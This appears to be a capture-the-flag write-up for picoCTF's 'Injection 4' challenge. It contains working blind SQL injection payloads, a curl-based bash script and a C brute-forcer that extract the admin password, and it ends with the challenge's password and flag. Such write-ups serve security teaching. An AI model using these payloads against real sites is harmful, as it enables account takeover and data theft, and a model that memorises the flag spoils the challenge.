Zach: Injection 4 (150 pts)
    
So by just quick inspection of the login script, it’s really clear that everything is SQL escaped, and so there are no real hacks available. Now with the registration feature, my first thought was a hack I’ve done before based on registering a user with the username admin followed by spaces past the varchar max length in the database, with a trailing character. This will be added to the database as just admin, with the password I instituted at registration. It will collide with the original admin on the database. However, if the user doesn’t exist, it echo’s that registration is disabled, so this is impossible.

So since there is no way to hack into the login script, it looks like we need to try and brute force the password. This can be done easily with the registration script because it’s not escaped. We can inject a query that instead of checking for a username, it will check for a password for the user admin, and the page will respond with “Someone has already registered {username}” if it finds one or more matches. This would look like the following in the username field:
    ```admin’ AND password=’{PASSWORD_GUESS}’ OR ‘1’=’2```

Of course, brute forcing this would take ages, but thankfully, SQL has a LIKE operator. This looks like the following:
    ```admin’ AND password LIKE ‘{FRONT_OF_PASS}%” OR ‘1’=’2```

In this operator, the % sign matches any number of characters in it’s place. This allows us to brute force every possible first character until we find the right one. Then every second character, and etc. until we have the whole password to login with. I used curl in a shell script to do this. Then I called the shell script with a C code that did the iteration of different password. Both codes are included below:
    

test_pass.sh:
```
#!/bin/bash
if [[ "$(curl -s -F "username=admin' AND password LIKE '$1%' OR '1'='2" http://web2014.picoctf.com/injection4/register.php)" =~ "Someone" ]]; then
	exit 1;
else
	exit 0;
fi
```

get_pass.c:
```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

const char* format = "./test_pass.sh '%s'";

int main() {
        char pass[1024], cmd[1080], *p = pass;
        int complete;
        while(1) {
                complete = 0;
                *p = 32;
                *(p+1) = '\0';
                do {
                        if(*p == '%' || *p == '\'') ++(*p);
                        sprintf(cmd, format, pass);
                        //printf("%s, %s, %d, %d\n", cmd, pass, *p, pass[p-pass]);
                        if( system(cmd) ) {
                                complete = 1;
                                break;
                        }

                } while (++(*p) > 0);
                if(complete) {
                        printf("\"%s\"\n", pass);
                } else {
                        printf("Finished.\n");
                        *p = '\0';
                        break;
                }
                ++p;
        }
        return 0;
}
```

The shellcode checks the output of curl to be approximately equal (=~) to “Someone”. If this is true, it exits with 1, else with 0. The c code creates space for the password and the cmd to execute on the shell, with enough room for 1023 characters (one extra byte for the null terminating character). Then, the pointer in the password char[] is iterated through all possible characters until one matches, and then goes to the next character. After no more characters will match, the password has been found and the code terminates. Because it takes some time, the code outputs it’s progress every time a new character is determined. The characters ‘\’’ and ‘%’ are excluded because % has special meaning for SQL (discussed above), and the single quote would terminate the string.

The password obtained from this script: `YOULLNEVERGUESSTHISPASSWORD`

If you login to the site as admin with that password, you receive:
    `whereof_one_cannot_speak_thereof_one_must_be_silent`
